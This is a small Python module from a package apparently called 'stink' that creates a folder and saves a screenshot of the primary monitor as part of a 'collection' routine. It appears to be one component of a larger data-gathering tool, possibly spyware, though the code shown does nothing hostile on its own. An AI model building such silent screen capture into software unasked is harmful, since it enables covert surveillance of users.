from os import mkdir, path

from stink.utils.screenshot import Screencapture


class Screenshot:
    """
    Takes a screenshot of the monitors.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__full_path = path.join(storage_path, folder)

    def __create_folder(self) -> None:
        """
        Creates storage for the Screenshot module.
        :return: None
        """
        if not path.exists(self.__full_path):
            mkdir(self.__full_path)

    def __create_screen(self) -> None:
        """
        Takes a screenshot of the monitors.
        :return: None
        """
        screenshot = Screencapture()
        screenshot.create(monitor=0, path=self.__full_path)

    def run(self) -> None:
        """
        Launches the screenshots collection module.
        :return: None
        """
        try:

            self.__create_folder()
            self.__create_screen()

        except Exception as e:
            print(f"[Screenshot]: {repr(e)}")
